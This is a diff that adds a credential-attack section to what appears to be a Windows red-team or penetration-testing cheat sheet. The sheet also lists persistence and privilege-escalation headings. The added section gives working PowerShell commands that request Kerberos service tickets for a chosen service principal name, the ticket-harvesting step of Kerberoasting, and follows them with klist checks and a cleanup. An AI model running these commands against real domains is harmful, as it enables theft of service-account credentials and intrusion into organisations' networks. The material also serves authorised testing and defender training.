@@ -25,6 +25,9 @@
   * [Persistence](#persistence)
     * [COM Hijacking](#com-hijacking)
     * [DLL Hijacking](#dll-hijacking)
+  * [Credentials](#credentials)
+    * [Kerberos Tickets](#kerberos-tickets)
+      * [Service Accounts](#service-accounts)
   * [Privilege Escalation](#privilege-escalation)
     * [Unquoted Service Path](#unquoted-service-path)
   * [Post Privilege Escalation](#post-privilege-ascalation)
@@ -256,6 +259,35 @@ Remove-Item "HKCU:\Software\Classes\CLSID\{<CLSID-ID>}" -Recurse
 
 ```
 # TODO
+```
+
+# **Credentials**
+
+## **Kerberos Tickets**
+
+### **Service Acounts**
+
+**NOTE:**
+
+Before doing this step you will want to enumerate for service acocunts in the domain which can be found in the *Domain Enumeration* section
+
+**Request Ticket of a Service Acocunt**
+
+```
+# Validate there is not Kerberos ticket on device before execution
+klist
+
+# Add NET Type
+Add-Type -AssemblyName System.IdentityModel
+
+# Request Service Account Ticket
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+
+# Validate Ticket is now on device
+klist
+
+# Clean-Up
+klist purge
 ```
 
 # **Privilege Escalation**
